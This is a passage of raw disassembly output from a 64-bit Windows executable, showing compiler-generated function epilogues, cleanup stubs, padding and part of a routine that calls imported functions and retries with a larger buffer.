   1400045a1:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   1400045a8:	48 8b 45 40          	mov    0x40(%rbp),%rax
   1400045ac:	f0 48 ff 08          	lock decq (%rax)
   1400045b0:	75 09                	jne    0x1400045bb
   1400045b2:	48 8d 4d 28          	lea    0x28(%rbp),%rcx
   1400045b6:	e8 c5 f4 ff ff       	call   0x140003a80
   1400045bb:	90                   	nop
   1400045bc:	48 83 c4 28          	add    $0x28,%rsp
   1400045c0:	5b                   	pop    %rbx
   1400045c1:	5f                   	pop    %rdi
   1400045c2:	5e                   	pop    %rsi
   1400045c3:	41 5e                	pop    %r14
   1400045c5:	41 5f                	pop    %r15
   1400045c7:	5d                   	pop    %rbp
   1400045c8:	c3                   	ret
   1400045c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400045d0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400045d5:	55                   	push   %rbp
   1400045d6:	41 57                	push   %r15
   1400045d8:	41 56                	push   %r14
   1400045da:	56                   	push   %rsi
   1400045db:	57                   	push   %rdi
   1400045dc:	53                   	push   %rbx
   1400045dd:	48 83 ec 28          	sub    $0x28,%rsp
   1400045e1:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   1400045e8:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400045ec:	e8 43 69 01 00       	call   0x14001af34
   1400045f1:	48 8d 05 3b ff ff ff 	lea    -0xc5(%rip),%rax        # 0x140004533
   1400045f8:	48 83 c4 28          	add    $0x28,%rsp
   1400045fc:	5b                   	pop    %rbx
   1400045fd:	5f                   	pop    %rdi
   1400045fe:	5e                   	pop    %rsi
   1400045ff:	41 5e                	pop    %r14
   140004601:	41 5f                	pop    %r15
   140004603:	5d                   	pop    %rbp
   140004604:	c3                   	ret
   140004605:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000460c:	00 00 00 00 
   140004610:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004615:	55                   	push   %rbp
   140004616:	41 57                	push   %r15
   140004618:	41 56                	push   %r14
   14000461a:	56                   	push   %rsi
   14000461b:	57                   	push   %rdi
   14000461c:	53                   	push   %rbx
   14000461d:	48 83 ec 28          	sub    $0x28,%rsp
   140004621:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   140004628:	31 c9                	xor    %ecx,%ecx
   14000462a:	e8 05 69 01 00       	call   0x14001af34
   14000462f:	48 8d 05 fd fe ff ff 	lea    -0x103(%rip),%rax        # 0x140004533
   140004636:	48 83 c4 28          	add    $0x28,%rsp
   14000463a:	5b                   	pop    %rbx
   14000463b:	5f                   	pop    %rdi
   14000463c:	5e                   	pop    %rsi
   14000463d:	41 5e                	pop    %r14
   14000463f:	41 5f                	pop    %r15
   140004641:	5d                   	pop    %rbp
   140004642:	c3                   	ret
   140004643:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000464a:	84 00 00 00 00 00 
   140004650:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004655:	55                   	push   %rbp
   140004656:	41 57                	push   %r15
   140004658:	41 56                	push   %r14
   14000465a:	56                   	push   %rsi
   14000465b:	57                   	push   %rdi
   14000465c:	53                   	push   %rbx
   14000465d:	48 83 ec 28          	sub    $0x28,%rsp
   140004661:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   140004668:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   14000466c:	e8 c3 68 01 00       	call   0x14001af34
   140004671:	48 89 45 30          	mov    %rax,0x30(%rbp)
   140004675:	48 89 55 40          	mov    %rdx,0x40(%rbp)
   140004679:	48 8d 05 25 fe ff ff 	lea    -0x1db(%rip),%rax        # 0x1400044a5
   140004680:	48 83 c4 28          	add    $0x28,%rsp
   140004684:	5b                   	pop    %rbx
   140004685:	5f                   	pop    %rdi
   140004686:	5e                   	pop    %rsi
   140004687:	41 5e                	pop    %r14
   140004689:	41 5f                	pop    %r15
   14000468b:	5d                   	pop    %rbp
   14000468c:	c3                   	ret
   14000468d:	0f 1f 00             	nopl   (%rax)
   140004690:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004695:	55                   	push   %rbp
   140004696:	41 57                	push   %r15
   140004698:	41 56                	push   %r14
   14000469a:	56                   	push   %rsi
   14000469b:	57                   	push   %rdi
   14000469c:	53                   	push   %rbx
   14000469d:	48 83 ec 28          	sub    $0x28,%rsp
   1400046a1:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   1400046a8:	31 c9                	xor    %ecx,%ecx
   1400046aa:	e8 85 68 01 00       	call   0x14001af34
   1400046af:	48 89 45 30          	mov    %rax,0x30(%rbp)
   1400046b3:	48 89 55 40          	mov    %rdx,0x40(%rbp)
   1400046b7:	48 8d 05 e7 fd ff ff 	lea    -0x219(%rip),%rax        # 0x1400044a5
   1400046be:	48 83 c4 28          	add    $0x28,%rsp
   1400046c2:	5b                   	pop    %rbx
   1400046c3:	5f                   	pop    %rdi
   1400046c4:	5e                   	pop    %rsi
   1400046c5:	41 5e                	pop    %r14
   1400046c7:	41 5f                	pop    %r15
   1400046c9:	5d                   	pop    %rbp
   1400046ca:	c3                   	ret
   1400046cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400046d0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400046d5:	55                   	push   %rbp
   1400046d6:	41 57                	push   %r15
   1400046d8:	41 56                	push   %r14
   1400046da:	56                   	push   %rsi
   1400046db:	57                   	push   %rdi
   1400046dc:	53                   	push   %rbx
   1400046dd:	48 83 ec 28          	sub    $0x28,%rsp
   1400046e1:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   1400046e8:	48 8b 45 40          	mov    0x40(%rbp),%rax
   1400046ec:	48 8b 50 08          	mov    0x8(%rax),%rdx
   1400046f0:	48 85 d2             	test   %rdx,%rdx
   1400046f3:	74 11                	je     0x140004706
   1400046f5:	48 8b 45 40          	mov    0x40(%rbp),%rax
   1400046f9:	4c 8b 40 10          	mov    0x10(%rax),%r8
   1400046fd:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140004701:	e8 ca d6 ff ff       	call   0x140001dd0
   140004706:	90                   	nop
   140004707:	48 83 c4 28          	add    $0x28,%rsp
   14000470b:	5b                   	pop    %rbx
   14000470c:	5f                   	pop    %rdi
   14000470d:	5e                   	pop    %rsi
   14000470e:	41 5e                	pop    %r14
   140004710:	41 5f                	pop    %r15
   140004712:	5d                   	pop    %rbp
   140004713:	c3                   	ret
   140004714:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000471b:	00 00 00 00 00 
   140004720:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004725:	55                   	push   %rbp
   140004726:	41 57                	push   %r15
   140004728:	41 56                	push   %r14
   14000472a:	56                   	push   %rsi
   14000472b:	57                   	push   %rdi
   14000472c:	53                   	push   %rbx
   14000472d:	48 83 ec 28          	sub    $0x28,%rsp
   140004731:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   140004738:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   14000473c:	e8 f3 67 01 00       	call   0x14001af34
   140004741:	48 8d 05 9b fd ff ff 	lea    -0x265(%rip),%rax        # 0x1400044e3
   140004748:	48 83 c4 28          	add    $0x28,%rsp
   14000474c:	5b                   	pop    %rbx
   14000474d:	5f                   	pop    %rdi
   14000474e:	5e                   	pop    %rsi
   14000474f:	41 5e                	pop    %r14
   140004751:	41 5f                	pop    %r15
   140004753:	5d                   	pop    %rbp
   140004754:	c3                   	ret
   140004755:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000475c:	00 00 00 00 
   140004760:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004765:	55                   	push   %rbp
   140004766:	41 57                	push   %r15
   140004768:	41 56                	push   %r14
   14000476a:	56                   	push   %rsi
   14000476b:	57                   	push   %rdi
   14000476c:	53                   	push   %rbx
   14000476d:	48 83 ec 28          	sub    $0x28,%rsp
   140004771:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   140004778:	31 c9                	xor    %ecx,%ecx
   14000477a:	e8 b5 67 01 00       	call   0x14001af34
   14000477f:	48 8d 05 5d fd ff ff 	lea    -0x2a3(%rip),%rax        # 0x1400044e3
   140004786:	48 83 c4 28          	add    $0x28,%rsp
   14000478a:	5b                   	pop    %rbx
   14000478b:	5f                   	pop    %rdi
   14000478c:	5e                   	pop    %rsi
   14000478d:	41 5e                	pop    %r14
   14000478f:	41 5f                	pop    %r15
   140004791:	5d                   	pop    %rbp
   140004792:	c3                   	ret
   140004793:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000479a:	84 00 00 00 00 00 
   1400047a0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400047a5:	55                   	push   %rbp
   1400047a6:	41 57                	push   %r15
   1400047a8:	41 56                	push   %r14
   1400047aa:	56                   	push   %rsi
   1400047ab:	57                   	push   %rdi
   1400047ac:	53                   	push   %rbx
   1400047ad:	48 83 ec 28          	sub    $0x28,%rsp
   1400047b1:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   1400047b8:	48 8b 4d 58          	mov    0x58(%rbp),%rcx
   1400047bc:	e8 73 67 01 00       	call   0x14001af34
   1400047c1:	48 8d 05 8d fc ff ff 	lea    -0x373(%rip),%rax        # 0x140004455
   1400047c8:	48 83 c4 28          	add    $0x28,%rsp
   1400047cc:	5b                   	pop    %rbx
   1400047cd:	5f                   	pop    %rdi
   1400047ce:	5e                   	pop    %rsi
   1400047cf:	41 5e                	pop    %r14
   1400047d1:	41 5f                	pop    %r15
   1400047d3:	5d                   	pop    %rbp
   1400047d4:	c3                   	ret
   1400047d5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400047dc:	00 00 00 00 
   1400047e0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400047e5:	55                   	push   %rbp
   1400047e6:	41 57                	push   %r15
   1400047e8:	41 56                	push   %r14
   1400047ea:	56                   	push   %rsi
   1400047eb:	57                   	push   %rdi
   1400047ec:	53                   	push   %rbx
   1400047ed:	48 83 ec 28          	sub    $0x28,%rsp
   1400047f1:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   1400047f8:	31 c9                	xor    %ecx,%ecx
   1400047fa:	e8 35 67 01 00       	call   0x14001af34
   1400047ff:	48 8d 05 4f fc ff ff 	lea    -0x3b1(%rip),%rax        # 0x140004455
   140004806:	48 83 c4 28          	add    $0x28,%rsp
   14000480a:	5b                   	pop    %rbx
   14000480b:	5f                   	pop    %rdi
   14000480c:	5e                   	pop    %rsi
   14000480d:	41 5e                	pop    %r14
   14000480f:	41 5f                	pop    %r15
   140004811:	5d                   	pop    %rbp
   140004812:	c3                   	ret
   140004813:	cc                   	int3
   140004814:	cc                   	int3
   140004815:	cc                   	int3
   140004816:	cc                   	int3
   140004817:	cc                   	int3
   140004818:	cc                   	int3
   140004819:	cc                   	int3
   14000481a:	cc                   	int3
   14000481b:	cc                   	int3
   14000481c:	cc                   	int3
   14000481d:	cc                   	int3
   14000481e:	cc                   	int3
   14000481f:	cc                   	int3
   140004820:	55                   	push   %rbp
   140004821:	48 89 e5             	mov    %rsp,%rbp
   140004824:	48 8b 09             	mov    (%rcx),%rcx
   140004827:	48 8b 41 10          	mov    0x10(%rcx),%rax
   14000482b:	48 85 c0             	test   %rax,%rax
   14000482e:	74 12                	je     0x140004842
   140004830:	83 f8 01             	cmp    $0x1,%eax
   140004833:	75 1b                	jne    0x140004850
   140004835:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140004839:	48 8b 51 20          	mov    0x20(%rcx),%rdx
   14000483d:	48 ff ca             	dec    %rdx
   140004840:	5d                   	pop    %rbp
   140004841:	c3                   	ret
   140004842:	48 8d 05 47 e6 06 00 	lea    0x6e647(%rip),%rax        # 0x140072e90
   140004849:	ba 04 00 00 00       	mov    $0x4,%edx
   14000484e:	5d                   	pop    %rbp
   14000484f:	c3                   	ret
   140004850:	31 c0                	xor    %eax,%eax
   140004852:	5d                   	pop    %rbp
   140004853:	c3                   	ret
   140004854:	cc                   	int3
   140004855:	cc                   	int3
   140004856:	cc                   	int3
   140004857:	cc                   	int3
   140004858:	cc                   	int3
   140004859:	cc                   	int3
   14000485a:	cc                   	int3
   14000485b:	cc                   	int3
   14000485c:	cc                   	int3
   14000485d:	cc                   	int3
   14000485e:	cc                   	int3
   14000485f:	cc                   	int3
   140004860:	55                   	push   %rbp
   140004861:	41 57                	push   %r15
   140004863:	41 56                	push   %r14
   140004865:	41 55                	push   %r13
   140004867:	41 54                	push   %r12
   140004869:	56                   	push   %rsi
   14000486a:	57                   	push   %rdi
   14000486b:	53                   	push   %rbx
   14000486c:	48 81 ec 78 04 00 00 	sub    $0x478,%rsp
   140004873:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   14000487a:	00 
   14000487b:	48 c7 85 f0 03 00 00 	movq   $0xfffffffffffffffe,0x3f0(%rbp)
   140004882:	fe ff ff ff 
   140004886:	48 89 8d d0 03 00 00 	mov    %rcx,0x3d0(%rbp)
   14000488d:	48 c7 85 d8 03 00 00 	movq   $0x0,0x3d8(%rbp)
   140004894:	00 00 00 00 
   140004898:	48 c7 85 e0 03 00 00 	movq   $0x2,0x3e0(%rbp)
   14000489f:	02 00 00 00 
   1400048a3:	48 c7 85 e8 03 00 00 	movq   $0x0,0x3e8(%rbp)
   1400048aa:	00 00 00 00 
   1400048ae:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   1400048b4:	b8 02 00 00 00       	mov    $0x2,%eax
   1400048b9:	48 89 85 c8 03 00 00 	mov    %rax,0x3c8(%rbp)
   1400048c0:	31 f6                	xor    %esi,%esi
   1400048c2:	31 ff                	xor    %edi,%edi
   1400048c4:	31 db                	xor    %ebx,%ebx
   1400048c6:	49 81 f8 01 02 00 00 	cmp    $0x201,%r8
   1400048cd:	73 31                	jae    0x140004900
   1400048cf:	eb 1e                	jmp    0x1400048ef
   1400048d1:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400048d8:	0f 1f 84 00 00 00 00 
   1400048df:	00 
   1400048e0:	0f 83 e8 00 00 00    	jae    0x1400049ce
   1400048e6:	49 81 f8 01 02 00 00 	cmp    $0x201,%r8
   1400048ed:	73 11                	jae    0x140004900
   1400048ef:	41 be 00 02 00 00    	mov    $0x200,%r14d
   1400048f5:	4c 8d 7d a8          	lea    -0x58(%rbp),%r15
   1400048f9:	4d 89 c4             	mov    %r8,%r12
   1400048fc:	eb 68                	jmp    0x140004966
   1400048fe:	66 90                	xchg   %ax,%ax
   140004900:	49 29 d8             	sub    %rbx,%r8
   140004903:	48 29 df             	sub    %rbx,%rdi
   140004906:	4c 39 c7             	cmp    %r8,%rdi
   140004909:	73 33                	jae    0x14000493e
   14000490b:	48 c7 44 24 20 02 00 	movq   $0x2,0x20(%rsp)
   140004912:	00 00 
   140004914:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   14000491a:	48 8d 8d d8 03 00 00 	lea    0x3d8(%rbp),%rcx
   140004921:	48 89 da             	mov    %rbx,%rdx
   140004924:	e8 b7 61 01 00       	call   0x14001aae0
   140004929:	48 8b b5 d8 03 00 00 	mov    0x3d8(%rbp),%rsi
   140004930:	48 8b 85 e0 03 00 00 	mov    0x3e0(%rbp),%rax
   140004937:	48 89 85 c8 03 00 00 	mov    %rax,0x3c8(%rbp)
   14000493e:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004943:	48 39 c6             	cmp    %rax,%rsi
   140004946:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   14000494b:	48 0f 42 de          	cmovb  %rsi,%rbx
   14000494f:	48 89 9d e8 03 00 00 	mov    %rbx,0x3e8(%rbp)
   140004956:	48 89 f7             	mov    %rsi,%rdi
   140004959:	49 89 de             	mov    %rbx,%r14
   14000495c:	4c 8b bd c8 03 00 00 	mov    0x3c8(%rbp),%r15
   140004963:	49 89 dc             	mov    %rbx,%r12
   140004966:	31 c9                	xor    %ecx,%ecx
   140004968:	ff 15 12 77 01 00    	call   *0x17712(%rip)        # 0x14001c080
   14000496e:	44 89 e1             	mov    %r12d,%ecx
   140004971:	4c 89 fa             	mov    %r15,%rdx
   140004974:	ff 15 0e 77 01 00    	call   *0x1770e(%rip)        # 0x14001c088
   14000497a:	41 89 c5             	mov    %eax,%r13d
   14000497d:	85 c0                	test   %eax,%eax
   14000497f:	75 0e                	jne    0x14000498f
   140004981:	ff 15 b1 76 01 00    	call   *0x176b1(%rip)        # 0x14001c038
   140004987:	85 c0                	test   %eax,%eax
   140004989:	0f 85 ab 00 00 00    	jne    0x140004a3a
   14000498f:	45 89 e8             	mov    %r13d,%r8d
   140004992:	4d 39 c4             	cmp    %r8,%r12
   140004995:	0f 85 45 ff ff ff    	jne    0x1400048e0
   14000499b:	ff 15 97 76 01 00    	call   *0x17697(%rip)        # 0x14001c038
   1400049a1:	83 f8 7a             	cmp    $0x7a,%eax
   1400049a4:	0f 85 c4 00 00 00    	jne    0x140004a6e
   1400049aa:	4d 01 e4             	add    %r12,%r12
   1400049ad:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
